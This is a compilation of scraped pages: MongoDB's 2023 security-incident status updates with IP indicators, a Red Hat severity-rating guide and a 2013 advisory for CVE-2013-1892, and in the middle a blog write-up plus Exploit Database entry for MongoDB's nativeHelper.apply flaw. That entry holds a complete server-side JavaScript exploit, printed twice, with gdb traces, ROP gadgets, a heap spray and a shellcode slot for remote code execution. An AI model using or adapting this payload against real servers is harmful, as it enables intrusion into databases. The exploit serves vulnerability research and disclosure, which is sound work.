**1/23/24 - 6:00 PM EST**

MongoDB has published a [Post Event Summary](https://www.mongodb.com/blog/post/mongodb-security-incident-post-event-summary-january-23-2023) for the security incident first reported here on December 16, 2023, US Eastern time (EST). As a reminder, our investigation is complete and closed, with our findings verified by our third-party forensic experts.

**1/03/24 - 5:00 PM EST**

Our investigation of the security incident first reported here on December 16, 2023, US Eastern time (EST) is now **complete and closed**.

The investigation led by our security and engineering teams uncovered no evidence of unauthorized access to MongoDB Atlas clusters. This finding has been verified by our third-party forensic experts.

We are committed to being timely and transparent with details about this Security Incident. We plan to release a post event summary as soon as practicable.

**12/20/23 - 9:00 PM EST**

We continue to find **no evidence of unauthorized access to MongoDB Atlas clusters or the Atlas cluster authentication system**.

Based on the investigation to date, the unauthorized third party used a phishing attack to gain access to some of the corporate applications that we use to provide support services to MongoDB customers. In collaboration with outside forensic experts, we currently have a high level of confidence that the unauthorized third party has been removed from our corporate applications and that this incident is contained.

We have identified a list of contact information and related account metadata that the unauthorized third party accessed from the compromised applications. We are providing the list of fields in the blog post linked below, along with incremental guidance about the indicators of compromise (IOCs) provided in our previous alert.

[Read the blog for details](https://www.mongodb.com/blog/post/mongodb-security-incident-update-december-20-2023)

As previously disclosed, the unauthorized third party primarily accessed MongoDB customer contact information and related account metadata. Over the last 24 hours, MongoDB personnel have individually contacted any customers with exposure beyond the fields listed in our blog post. This was a separate communication from the initial security notice sent over this past weekend.

Moving forward, we will provide updates when we have notable new information.

**12/18/23 - 9:00 PM EST**

We continue to find **no evidence of unauthorized access to MongoDB Atlas clusters or the Atlas cluster authentication system**. Our investigation and work with the relevant authorities is ongoing. MongoDB will update this alert page with pertinent information as we further investigate the matter.

At this time, as a result of our investigation in collaboration with outside experts, we have high confidence that we were victims of a phishing attack. Through our investigation, we have identified certain information that may be helpful to protect yourself against a potential attack by this unauthorized party:

**Indicators of Compromise (IOCs)**

The unauthorized party used the Mullvad VPN. Mullvad has many external IP addresses, and there are many VPNs that can be used to hide an IP address. In this case, we saw malicious activity coming from the following IP addresses:

+ 107.150.22.47

+ 138.199.6.199

+ 146.70.187.157

+ 179.43.189.85

+ 185.156.46.165

+ 198.44.136.69

+ 198.44.136.71

+ 198.44.140.133

+ 198.44.140.199

+ 199.116.118.207

+ 206.217.205.88

+ 66.63.167.152

+ 66.63.167.154

+ 87.249.134.10

+ 96.44.191.132

We recommend using the above information to search your networks for suspicious activity. We are committed to being as transparent in this process as we can and providing information so you can assess risk in your network.

In regards to our previous guidance, [here](https://www.mongodb.com/docs/atlas/security-multi-factor-authentication/) are instructions on how to enable phishing-resistant MFA on MongoDB’s native cloud authentication service. MongoDB Cloud also supports federating your identity from your IDP, please see [here](https://www.mongodb.com/docs/atlas/security/federated-authentication/).

We have fielded questions from some customers about the authenticity of the e-mail titled: MongoDB Security Notice that our Chief Information Security Officer, Lena Smart, sent over the weekend from mongodbteam@mail1.mongodb.com. We can confirm that this email is legitimate.

**12/17/23 - 9:00 PM EST**

At this time, we have found **no evidence of unauthorized access to MongoDB Atlas clusters.** To be clear, we have not identified any security vulnerability in any MongoDB product as a result of this incident. It is important to note that MongoDB Atlas cluster access is authenticated via a separate system from MongoDB corporate systems, and we have found no evidence that the Atlas cluster authentication system has been compromised.

We are aware of unauthorized access to some corporate systems that contain customer names, phone numbers, and email addresses among other customer account metadata, including system logs for one customer. We have notified the affected customer. At this time, we have found no evidence that any other customers’ system logs were accessed.

We are continuing with our investigation, and are working with relevant authorities and forensic firms. MongoDB will update this alert page with additional information as we continue to investigate the matter.

**12/16/2023 - 05:25 PM EST**

We are experiencing a spike in login attempts resulting in issues for customers attempting to log in to Atlas and our Support Portal. This is unrelated to the security incident. Please try again in a few minutes if you are still having trouble logging in. **[The issue involving user login attempts has been resolved as of 10:22 PM EST]**

**12/16/2023 - 03:00 PM EST**

MongoDB is actively investigating a security incident involving unauthorized access to certain MongoDB corporate systems, which includes exposure of customer account metadata and contact information. We detected suspicious activity on Wednesday (Dec. 13th, 2023) evening US Eastern Standard Time, immediately activated our incident response process, and believe that this unauthorized access has been going on for some period of time before discovery. **At this time, we are not aware of any exposure to the data that customers store in MongoDB Atlas.** Nevertheless, we recommend that customers be vigilant for social engineering and phishing attacks, activate phishing-resistant multi-factor authentication (MFA), and regularly rotate their MongoDB Atlas passwords. MongoDB will update this alert page with additional information as we continue to investigate the matter.

# mongodb – SSJI to RCE

## Lucky discovery

Trying some server side javascript injection in mongodb, I wondered if it would be possible to pop a shell.
The [run](http://docs.mongodb.org/manual/reference/method/run/ "run merhod") method seems good for this :

```
> run("uname","-a")
Sun Mar 24 07:09:49 shell: started program uname -a
sh1838| Linux mongo 2.6.32-5-686 #1 SMP Sun Sep 23 09:49:36 UTC 2012 i686 GNU/Linux
0
```

Unfortunately, this command is only effective in mongo client :

```
> db.my_collection.find({$where:"run('ls')"})
error: {
 "$err" : "error on invocation of $where function:nJS Error: ReferenceError: run is not defined nofile_a:0",
 "code" : 10071
}
```

But let’s dig a little bit.

```
> run
function () {
    return nativeHelper.apply(run_, arguments);
}
```

So you can run the “run” function directly by calling *nativeHelper.apply(run\_,[“uname”,”-a”]);*
In server side, the result show us that *nativeHelper.apply* method exists !

```
> db.my_collection.find({$where:'nativeHelper.apply(run_, ["uname","-a"]);'})
error: {
	"$err" : "error on invocation of $where function:nJS Error: ReferenceError: run_ is not defined nofile_a:0",
	"code" : 10071
}
```

So what’s *run\_* ?

```
So what's "run_"
> run_
{ "x" : 135246144 }
```

An associative array, can we use it in server side ?

```
> db.my_collection.find({$where:'nativeHelper.apply({"x":135246144}, ["uname","-a"]);'})
Sun Mar 24 07:15:26 DBClientCursor::init call() failed
Sun Mar 24 07:15:26 query failed : sthack.my_collection { $where: "nativeHelper.apply({"x":135246144}, ["uname","-a"]);" } to: 127.0.0.1:27017
Error: error doing query: failed
Sun Mar 24 07:15:26 trying reconnect to 127.0.0.1:27017
Sun Mar 24 07:15:26 reconnect 127.0.0.1:27017 failed couldn't connect to server 127.0.0.1:27017
```

The server crashed o/ !

Let’s check the source code :
*./src/mongo/scripting/engine\_spidermonkey.cpp*

```
JSBool native_helper( JSContext *cx , JSObject *obj , uintN argc, jsval *argv , jsval *rval ) {
        try {
            Convertor c(cx);
            NativeFunction func = reinterpret_cast(
                    static_cast( c.getNumber( obj , "x" ) ) );
            void* data = reinterpret_cast<void*>(
                    static_cast( c.getNumber( obj , "y" ) ) );
            verify( func );

            BSONObj a;
            if ( argc > 0 ) {
                BSONObjBuilder args;
                for ( uintN i = 0; i < argc; ++i ) {
                    c.append( args , args.numStr( i ) , argv[i] );
                }
                a = args.obj();
            }

            BSONObj out;
            try {
                out = func( a, data );
            }
            catch ( std::exception& e ) {
```

*nativeHelper* is a crazy feature in spidermonkey missused by mongodb:
the *NativeFunction func* come from *x* javascript object and then is called without any check !!!

```
> db.my_collection.find({$where:'nativeHelper.apply({"x":0x31337}, ["uname","-a"]);'})

Sun Mar 24 07:20:03 Invalid access at address: 0x31337 from thread: conn1
Sun Mar 24 07:20:03 Got signal: 11 (Segmentation fault).
```
## Exploitation

Challenge now is to make a reliable exploit bypassing NX and ASLR (on x86 32bits for the moment).
To achieve this let’s debug it !

The *func NativeFunction* take 2 arguments : the first one is the *arguments* array from javascript call in *BSONObj* format.
The second one is a number from *y*.

In gdb if we look at eax when the crash occurs **[eax]=pointer on our BSONObj**

```
gdb$ x/wx $eax
0xb21ae868:     0x0917a77c
gdb$ x/10s 0x0917a77c
0x917a77c:      "N"
0x917a77e:      ""
0x917a77f:      ""
0x917a780:      "0260"
0x917a783:      "B"
0x917a785:      ""
0x917a786:      ""
0x917a787:      'a' <repeats 65 times>
```

So we need gadgets to pivot in the **[[eax]]+>0xb**

```
0x836e204:   mov    eax,DWORD PTR [eax]
0x836e206:   mov    DWORD PTR [esp+0x4],0x20
0x836e20e:   mov    DWORD PTR [esp],esi
0x836e211:   call   DWORD PTR [eax+0x1c]
```

This one will dereference **eax** and then call **[eax+0x1c]** that we control.
So we can put a second gadget to **xchg esp, eax** at our *arguments+0x11*
This gadget must also increment **esp** to point in our buffer and not in BSONObj structure.

Here is a little problem : *arguments* is UTF-8 encoded so we have to find gadgets with bytes inferior to 0x7f.
**0x08457158** respects it :

```
0x8457158:   xchg   esp,eax
0x8457159:   xor    BYTE PTR [eax],al
0x845715b:   add    esp,0x4
0x845715e:   pop    ebx
0x845715f:   pop    ebp
0x8457160:   ret
```

So the ret will fall in *arguments+0x01*, that’s okay for us, we can put another gadget here.
We need to increment the stack pointer to escape the second gadget at *arguments+0x11*

```
0x8351826:   add    esp,0x20
0x8351829:   pop    esi
0x835182a:   pop    edi
0x835182b:   pop    ebp
0x835182c:   ret
```

Here we go ! Our stack is controlled, but the UTF-8 limitation is really bad, the *mmap64@plt* is at address **0x816f768** so we can’t use it in *arguments*. Let’s pivot again.

As we are in javascript environment the same techniques used in browser could be effective !
Sorry but we will heapspray !
The first one with **NOP+SHELLCODE** and we will mmap it **RWX**.
The second one with our **RETCHAIN+ROPCHAIN** that call mmap without UTF-8 limitation.

**0x20202020 => RETCHAIN+ROPCHAIN**
So we need a gadget to put it in eax then **xchg esp, eax** again.

```
0x8055a6c:   pop    eax
0x8055a6d:   adc    dl,0x27
0x8055a70:   ret
```

then **0x08457158**, the same as above will pivot the stack.

Here we go again ! Our stack is controlled without any contraints !
The next part is simple as mmap64 is directly callable via plt.

Return to mmap64@plt : 0x816f768 and stack look like that

```
0x0c0c0c0c => nop sled where to ret after mmap64
0x0c0c0000 *addr
0x00001000 size
0x00000007 RWX prot
0x00000031 MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS
0xffffffff
0x00000000
```

Here is the total exploit :

```
db.my_collection.find({'$where':'shellcode=unescape("METASPLOIT JS GENERATED SHELLCODE"); sizechunk=0x1000; chunk=""; for(i=0;i<sizechunk;i++){ chunk+=unescape("%u9090%u9090"); } chunk=chunk.substring(0,(sizechunk-shellcode.length)); testarray=new Array(); for(i=0;i<25000;i++){ testarray[i]=chunk+shellcode; } ropchain=unescape("%uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000"); sizechunk2=0x1000; chunk2=""; for(i=0;i<sizechunk2;i++){ chunk2+=unescape("%u5a70%u0805"); } chunk2=chunk2.substring(0,(sizechunk2-ropchain.length)); testarray2=new Array(); for(i=0;i<25000;i++){ testarray2[i]=chunk2+ropchain; } nativeHelper.apply({"x" : 0x836e204}, ["A"+"x26x18x35x08"+"MongoSploit!"+"x58x71x45x08"+"sthack is a nice place to be"+"x6cx5ax05x08"+"x20x20x20x20"+"x58x71x45x08"]);'})
```

This feature/vulnerability was reported 3 weeks ago to 10gen developers, no patch was commit but the default javascript engine was changed in last version so there is no more nativeHelper.apply function.

A metasploit module is comming soon…

#Title: MongoDB nativeHelper.apply Remote Code Execution
#Author: agixid http://blog.scrt.ch/2013/03/24/mongodb-0-day-ssji-to-rce/
#Software Link: http://fastdl.mongodb.org/linux/mongodb-linux-i686-2.2.3.tgz
#Version: 2.2.3

The following PoC exploits the "nativeHelper" feature in the spidermonkey mongodb implementation.
the NativeFunction "func" come from "x" javascript object and then is called without any check:

db.my_collection.find({'$where':'shellcode=unescape("METASPLOIT JS GENERATED SHELLCODE"); sizechunk=0x1000; chunk=""; for(i=0;i<sizechunk;i++){ chunk+=unescape("%u9090%u9090"); } chunk=chunk.substring(0,(sizechunk-shellcode.length)); testarray=new Array(); for(i=0;i<25000;i++){ testarray[i]=chunk+shellcode; } ropchain=unescape("%uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000"); sizechunk2=0x1000; chunk2=""; for(i=0;i<sizechunk2;i++){ chunk2+=unescape("%u5a70%u0805"); } chunk2=chunk2.substring(0,(sizechunk2-ropchain.length)); testarray2=new Array(); for(i=0;i<25000;i++){ testarray2[i]=chunk2+ropchain; } nativeHelper.apply({"x" : 0x836e204}, ["A"+"\x26\x18\x35\x08"+"MongoSploit!"+"\x58\x71\x45\x08"+"sthack is a nice place to be"+"\x6c\x5a\x05\x08"+"\x20\x20\x20\x20"+"\x58\x71\x45\x08"]);'})

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

## Synopsis

Important: mongodb and pymongo security and enhancement update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2013%3A1170)

## Topic

Updated mongodb and pymongo packages that fix two security issues and add
one enhancement are now available for Red Hat Enterprise MRG 2.3 for Red
Hat Enterprise Linux 6.

The Red Hat Security Response Team has rated this update as having
important security impact. Common Vulnerability Scoring System (CVSS) base
scores, which give detailed severity ratings, are available for each
vulnerability from the CVE links in the References section.

## Description

MongoDB is a NoSQL database. PyMongo provides tools for working with
MongoDB.

A flaw was found in the run() function implementation in MongoDB. A
database user permitted to send database queries to a MongoDB server could
use this flaw to crash the server or, possibly, execute arbitrary code with
the privileges of the mongodb user. (CVE-2013-1892)

A NULL pointer dereference flaw was found in PyMongo. An invalid DBRef
record received from a MongoDB server could cause an application using
PyMongo to crash. (CVE-2013-2132)

Note: In Red Hat Enterprise MRG Grid, MongoDB is not accessed by users
directly and is only accessed by other Grid services, such as Condor and
Cumin.

This update also adds the following enhancement:

* Previously, MongoDB was configured to listen for connections on all

network interfaces. This could allow remote users to access the database if
the firewall was configured to allow access to the MongoDB port (access is
blocked by the default firewall configuration in Red Hat Enterprise Linux).
This update changes the configuration to only listen on the loopback
interface by default. (BZ#892767)

Users of Red Hat Enterprise MRG 2.3 for Red Hat Enterprise Linux 6 are
advised to upgrade to these updated packages, which contain backported
patches to resolve these issues and add this enhancement. After installing
this update, MongoDB will be restarted automatically.

## Solution

Before applying this update, make sure all previously released errata
relevant to your system have been applied.

This update is available via the Red Hat Network. Details on how to
use the Red Hat Network to apply this update are available at
<https://access.redhat.com/site/articles/11258>

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
